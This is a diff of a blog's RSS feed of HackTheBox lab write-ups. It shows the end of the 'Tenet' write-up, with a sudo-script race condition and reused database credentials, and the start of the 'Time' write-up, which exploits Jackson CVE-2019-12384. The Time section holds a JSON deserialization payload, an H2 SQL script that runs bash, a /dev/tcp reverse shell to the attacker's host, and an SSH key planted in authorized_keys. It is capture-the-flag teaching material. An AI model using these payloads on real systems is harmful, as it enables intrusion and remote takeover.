-bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1545<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
-bash: no job control in this shell
-www-data@tenet:/var/www/html$ id
-id
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-www-data@tenet:/var/www/html$
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210614195508219.png" alt="image-20210614195508219"  /></div>
-</p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-neil">Shell as neil</h3>
-<h4 id="wp-config">WP config</h4>
-<p>Inside the <code>wp-config.php</code> file, there is a database credential.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
-cat wp-config.php
-&lt;?php
-
-...&lt;SNIP&gt;...
-define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;wordpress&#39;</span> <span class="o">)</span><span class="p">;</span>
-
-/** MySQL database username */
-define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;neil&#39;</span> <span class="o">)</span><span class="p">;</span>
-
-/** MySQL database password */
-define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;Opera2112&#39;</span> <span class="o">)</span><span class="p">;</span>
-...&lt;SNIP&gt;...
-</code></pre></div><h4 id="ssh---neil">SSH - Neil</h4>
-<p>The credentials works on SSH (<code>neil:Opera2112</code>)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
-$ ssh neil@10.10.10.223
-neil@10.10.10.223<span class="err">&#39;</span>s password:
-Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>
-
-...&lt;SNIP&gt;...
-
-Last login: Mon Jun <span class="m">14</span> 12:57:27 <span class="m">2021</span> from 10.10.16.12
-neil@tenet:~$ id
-<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span>
-</code></pre></div><p>User&rsquo;s flag is done here.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ ls -l
-total <span class="m">4</span>
--r-------- <span class="m">1</span> neil neil <span class="m">33</span> Jun <span class="m">14</span> 06:46 user.txt
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210614200613572.png" alt="image-20210614200613572"  /></div>
-</p>
-<hr>
-<h3 id="shell-as-root">Shell as root</h3>
-<h4 id="sudo-privileges">Sudo privileges</h4>
-<p>User neil has sudo privileges on a custom script called <code>enableSSH.sh</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ sudo -l
-Matching Defaults entries <span class="k">for</span> neil on tenet:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>
-
-User neil may run the following commands on tenet:
-    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
-neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh
--rwxr-xr-x <span class="m">1</span> root root <span class="m">1080</span> Dec  <span class="m">8</span>  <span class="m">2020</span> /usr/local/bin/enableSSH.sh
-</code></pre></div><h4 id="script-analysis">Script analysis</h4>
-<p>The following is the contents of <code>enableSSH.sh</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
-</span><span class="cp"></span>
-checkAdded<span class="o">()</span> <span class="o">{</span>
-
-        <span class="nv">sshName</span><span class="o">=</span><span class="k">$(</span>/bin/echo <span class="nv">$key</span> <span class="p">|</span> /usr/bin/cut -d <span class="s2">&#34; &#34;</span> -f 3<span class="k">)</span>
-
-        <span class="k">if</span> <span class="o">[[</span> ! -z <span class="k">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
-
-                /bin/echo <span class="s2">&#34;Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
-
-        <span class="k">else</span>
-
-                /bin/echo <span class="s2">&#34;Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
-
-        <span class="k">fi</span>
-
-<span class="o">}</span>
-
-checkFile<span class="o">()</span> <span class="o">{</span>
-
-        <span class="k">if</span> <span class="o">[[</span> ! -s <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> ! -f <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
-
-                /bin/echo <span class="s2">&#34;Error in creating key file!&#34;</span>
-
-                <span class="k">if</span> <span class="o">[[</span> -f <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi</span>
-
-                <span class="nb">exit</span> <span class="m">1</span>
-
-        <span class="k">fi</span>
-
-<span class="o">}</span>
-
-addKey<span class="o">()</span> <span class="o">{</span>
-
-        <span class="nv">tmpName</span><span class="o">=</span><span class="k">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class="k">)</span>
-
-        <span class="o">(</span><span class="nb">umask</span> 110<span class="p">;</span> touch <span class="nv">$tmpName</span><span class="o">)</span>
-
-        /bin/echo <span class="nv">$key</span> &gt;&gt;<span class="nv">$tmpName</span>
-
-        checkFile <span class="nv">$tmpName</span>
-
-        /bin/cat <span class="nv">$tmpName</span> &gt;&gt;/root/.ssh/authorized_keys
-
-        /bin/rm <span class="nv">$tmpName</span>
-
-<span class="o">}</span>
-
-<span class="nv">key</span><span class="o">=</span><span class="s2">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
-addKey
-checkAdded
-</code></pre></div><p>The contents of the <code>$key</code> variable will be saved to a temporary file at <code>/tmp/SSH-randomfilename</code> before being added to the <code>/root/.ssh/authorized_keys</code> file by the <code>addKey()</code> function.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="nv">tmpName</span><span class="o">=</span><span class="k">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class="k">)</span>
-neil@tenet:~$ <span class="nb">echo</span> <span class="nv">$tmpName</span>
-/tmp/ssh-4swbpcnN
-</code></pre></div><p>Then the  <code>checkAdded()</code> function will take the  <code>username@hostname</code> part from the value of <code>$key</code> which is <code>root@ubuntu</code> and check if it already exist in <code>/root/.ssh/authorized_keys</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...&lt;SNIP&gt;...
- <span class="k">if</span> <span class="o">[[</span> ! -z <span class="k">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
-                /bin/echo <span class="s2">&#34;Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
-        <span class="k">else</span>
-                /bin/echo <span class="s2">&#34;Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
-        <span class="k">fi</span>
-...&lt;SNIP&gt;...
-</code></pre></div><p>The idea here is if I could overwrite the file contents of <code>/tmp/ssh-randomfilename</code> with my own public key then I should be able to log in as root using my private key. So, it&rsquo;s a race condition.</p>
-<h4 id="exploiting-enablesshsh">Exploiting enableSSH.sh</h4>
-<p>Just like how I did earlier on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/#exploiting-scanloserssh">ScriptKiddie</a>, I&rsquo;ll also use while loop to keep inserting my public key at <code>/tmp/ssh-*</code>, but this time, I&rsquo;ll use a binary called <code>tee</code>.</p>
-<p>First, I&rsquo;ll put my public key at Neil&rsquo;s home directory.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@iamf&#39;</span> &gt; .iamf
-</code></pre></div><p>And Then I&rsquo;ll run this loop to keep user <code>neil</code> executing sudo.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> sudo /usr/local/bin/enableSSH.sh<span class="p">;</span> <span class="k">done</span><span class="p">;</span>
-</code></pre></div><p>I&rsquo;ll open another neil&rsquo;s session and run this.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="k">while</span> sleep 0.1<span class="p">;</span> <span class="k">do</span> cat .iamf <span class="p">|</span> tee /tmp/ssh-*<span class="p">;</span><span class="k">done</span>
-</code></pre></div><p>On my Kali, I will do SSH login in loop.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
-$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> ssh -oConnectTimeout<span class="o">=</span>1s -oPasswordAuthentication<span class="o">=</span>no root@10.10.10.223 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
-</code></pre></div><p>After some minutes, I can finally login as root.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
-$ ssh root@10.10.10.223
-Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>
-
-...&lt;SNIP&gt;...
-
-Last login: Tue Jun <span class="m">15</span> 09:50:37 <span class="m">2021</span> from 10.10.14.53
-root@tenet:~# id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210615165352952.png" alt="image-20210615165352952"  /></div>
-</p>
-<p>Root flag is done here.</p>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Tenet</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-tenet/</link>
-      <pubDate>Mon, 14 Jun 2021 21:46:38 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-tenet/</guid>
       <description>Friendly PHP insecure deserialization attack and race condition</description>
       <content:encoded><![CDATA[<p>Tenet from Hack The Box hosts a Website that is vulnerable to PHP deserialization, and this can be exploited for initial access. Enumerating inside the system reveals a set of database credentials, and these are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</p>
 <h4 id="skills-learned">Skills Learned</h4>
@@ -2281,6 +1429,769 @@ sonny@CEREAL C:\Users\sonny&gt;dir desktop\
 <li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
 <li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li>
 <li><a href="https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Time</title>
+      <link>https://fahmifj.github.io/hackthebox/time/</link>
+      <pubDate>Sun, 09 May 2021 05:43:58 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/time/</guid>
+      <description>Exploiting an insecure deserialization on Jackson library and how to mitigate it</description>
+      <content:encoded><![CDATA[<p>Time from HackTheBox features a web application that provides JSON beautifier and validator services. Inserting some invalid inputs exposes the application&rsquo;s error message, indicating it uses the Jackson library. Searching for the error message on Google leads to a post about deserialization attack on Jackson. The attack is then reproduced to gain initial access. Enumerating on the system discovers a timer script that is executed by root every 10 seconds. The script is world-writable, allowing me to inject a malicious code and obtain a root shell.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Deserialization Attack on Jackson (CVE-2019-12384)</li>
+<li>Exploiting Systemd timers</li>
+<li>Mitigation of CVE-2019-12384</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p><code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 80.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
+$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oA nmap/10-initial-time 10.10.10.214 
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-08 07:29 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.214
+Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
+Not shown: <span class="m">998</span> closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Online JSON parser
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 27.18 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting port 80 shows a website called &ldquo;Online JSON Beautifier &amp; Validator&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210508184016068.png" alt="image-20210508184016068"  /></div>
+</p>
+<p>Clicking on the drop down menu, it provides two options: &ldquo;Beautify&rdquo; and &ldquo;Validate (beta!)&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210508184059429.png" alt="image-20210508184059429"  /></div>
+</p>
+<h4 id="testing-inputs">Testing Inputs</h4>
+<p>I submitted <code>{&quot;test&quot;: &quot;iamf&quot;}</code> to the input box and clicked the &ldquo;Process&rdquo; button. As expected, the beautify option just a JSON beautifier like <a href="https://stedolan.github.io/jq/">jq</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210508184420130.png" alt="image-20210508184420130"  /></div>
+</p>
+<p>I submitted the same input on &ldquo;Validate (beta!)&rdquo;, but this time it returns the following error.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210508184904577.png" alt="image-20210508184904577"  /></div>
+</p>
+<p>I found this <a href="https://www.baeldung.com/jackson-inheritance#1-global-default-typing">site</a> while searching for the error message on Google. It turned out it wanted an array input, so I copied the sample input from that site and pasted it to the validator.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span> 
+<span class="s2">&#34;org.baeldung.jackson.inheritance.Truck&#34;</span><span class="p">,</span>
+<span class="p">{</span> <span class="nt">&#34;make&#34;</span><span class="p">:</span> <span class="s2">&#34;Isuzu&#34;</span><span class="p">,</span> <span class="nt">&#34;model&#34;</span><span class="p">:</span> <span class="s2">&#34;NQR&#34;</span><span class="p">,</span><span class="nt">&#34;payloadCapacity&#34;</span><span class="p">:</span> <span class="mf">7500.0</span> <span class="p">}</span>
+<span class="p">]</span>
+</code></pre></div><p>And now it returns a different error message.</p>
+<p><div class="img-container"><img src="imgs/image-20210508195850042.png" alt="image-20210508195850042"  /></div>
+</p>
+<p>And that&rsquo;s because it probably can&rsquo;t find <code>org.baeldung.jackson.inheritance.Truck</code> since I made it up.</p>
+<h4 id="finding-vulnerability">Finding Vulnerability</h4>
+<p>I might be able to inject the &ldquo;<code>org.baeldung.jackson.inheritance.Truck</code>&rdquo; with a java gadget class for deserialization attack, and after searching around about deserialization topics on Jackson, I found this two blog posts about Jackson RCE:</p>
+<ul>
+<li><a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/">Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill</a></li>
+<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">Jackson gadgets - Anatomy of a vulnerability · Doyensec&rsquo;s Blog</a></li>
+</ul>
+<p>However, the post on Doyensec&rsquo;s blog is newer (2019 vs 2017), so I dig into that blog. The researcher on that blog uses <code>ch.qos.logback.core.db.DriverManagerConnectionSource</code> as his gadget class, leveraging the alias feature from the H2 database to execute arbitrary code. This research is classified as CVE-2019-12384.</p>
+<p>Below is the example payload used.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span><span class="s2">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;&#34;</span><span class="p">}]</span>
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-pericles">Shell as pericles</h3>
+<h4 id="exploiting-jackson-cve-2019-12384">Exploiting Jackson CVE-2019-12384</h4>
+<p>I&rsquo;ll use the research from Doyensec&rsquo;s blog above as my reference.</p>
+<p>First, I&rsquo;ll create a copy of the <code>inject.sql</code> file that is used by the researcher.</p>
+<p><code>inject.sql</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">CREATE</span> <span class="n">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="n">AS</span> <span class="n">$$</span> <span class="n">String</span> <span class="nf">shellexec</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
+	<span class="n">String</span><span class="o">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
+	<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">command</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
+	<span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>  <span class="o">}</span>
+<span class="n">$$</span><span class="o">;</span>
+<span class="n">CALL</span> <span class="nf">SHELLEXEC</span><span class="o">(</span><span class="err">&#39;</span><span class="n">id</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">10</span><span class="o">.</span><span class="na">10</span><span class="o">.</span><span class="na">14</span><span class="o">.</span><span class="na">19</span><span class="o">/</span><span class="n">9000</span><span class="err">&#39;</span><span class="o">)</span>
+</code></pre></div><p>Then, I&rsquo;ll setup a Python web server to host the SQL file and an <code>nc</code> listener to catch the request.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
+$ python3 -m http.server <span class="m">80</span>
+Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div><p>Now I&rsquo;ll use the following JSON payload and submit it to the validator.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span><span class="s2">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.19/inject.sql&#39;&#34;</span><span class="p">}]</span>
+</code></pre></div><p>Within a few seconds, my Python web server receives a request for <code>inject.sql</code>, and my listener captures the output of the <code>id</code> command.</p>
+<p><div class="img-container"><img src="imgs/image-20210508204955144.png" alt="image-20210508204955144"  /></div>
+</p>
+<p>Knowing this, I can weaponize the <code>inject.sql</code> file to send myself a shell, and then perform the same procedure as above.</p>
+<h4 id="weaponization---reverse-shell">Weaponization - Reverse Shell</h4>
+<p>Now with the following <code>inject.sql</code>,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">CREATE</span> <span class="n">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="n">AS</span> <span class="n">$$</span> <span class="n">String</span> <span class="nf">shellexec</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
+	<span class="n">String</span><span class="o">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
+	<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">command</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
+	<span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>  <span class="o">}</span>
+<span class="n">$$</span><span class="o">;</span>
+<span class="n">CALL</span> <span class="nf">SHELLEXEC</span><span class="o">(</span><span class="err">&#39;</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">10</span><span class="o">.</span><span class="na">10</span><span class="o">.</span><span class="na">14</span><span class="o">.</span><span class="na">19</span><span class="o">/</span><span class="n">9000</span> <span class="n">0</span><span class="o">&gt;&amp;</span><span class="n">1</span><span class="err">&#39;</span><span class="o">)</span>
+</code></pre></div><p>I can obtain an interactive shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
+$ nc -nvlp <span class="m">9000</span>            
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+connect to <span class="o">[</span>10.10.14.19<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214<span class="o">]</span> <span class="m">42496</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>944<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+pericles@time:/var/www/html$ 
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210508205643332.png" alt="image-20210508205643332"  /></div>
+</p>
+<h4 id="upgrade-to-ssh">Upgrade to SSH</h4>
+<p>With current access, I can put my public key to the <code>authorized_keys</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:/home/pericles$ mkdir .ssh
+pericles@time:/home/pericles$
+pericles@time:/home/pericles$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; .ssh/authorized_keys
+</code></pre></div><p>Now I can login as <code>pericles</code> with my SSH private key.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
+$ ssh pericles@10.10.10.214 
+Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-52-generic x86_64<span class="o">)</span>
+
+...&lt;SNIP&gt;...
+  System load:             0.0
+  Usage of /:              21.2% of 27.43GB
+  Memory usage:            16%
+  Swap usage:              0%
+  Processes:               <span class="m">235</span>
+  Users logged in:         <span class="m">0</span>
+  IPv4 address <span class="k">for</span> ens160: 10.10.10.214
+  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:a553
+
+...&lt;SNIP&gt;...
+Last login: Fri Oct <span class="m">23</span> 09:19:19 <span class="m">2020</span> from 10.10.14.5
+pericles@time:~$ id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span>
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p><code>pericles</code> is the only user on this box.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:/home/pericles$ cat /etc/passwd <span class="p">|</span> grep sh$
+cat /etc/passwd <span class="p">|</span> grep sh$
+root:x:0:0:root:/root:/bin/bash
+pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
+</code></pre></div><p>While searching files owned by <code>pericles</code>, I spotted a script called <code>timer_backup.sh</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ find / -type f -user pericles 2&gt;/dev/null <span class="p">|</span>grep -v <span class="s1">&#39;proc\|sys&#39;</span>
+/usr/bin/timer_backup.sh
+/dev/shm/payloadds9LXy
+/home/pericles/.gnupg/trustdb.gpg
+/home/pericles/.gnupg/pubring.kbx
+/home/pericles/.bashrc
+...&lt;SNIP&gt;...
+</code></pre></div><p>The script is backing up the website contents in <code>/var/www/html</code> to the root home directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /usr/bin/timer_backup.sh
+<span class="c1">#!/bin/bash</span>
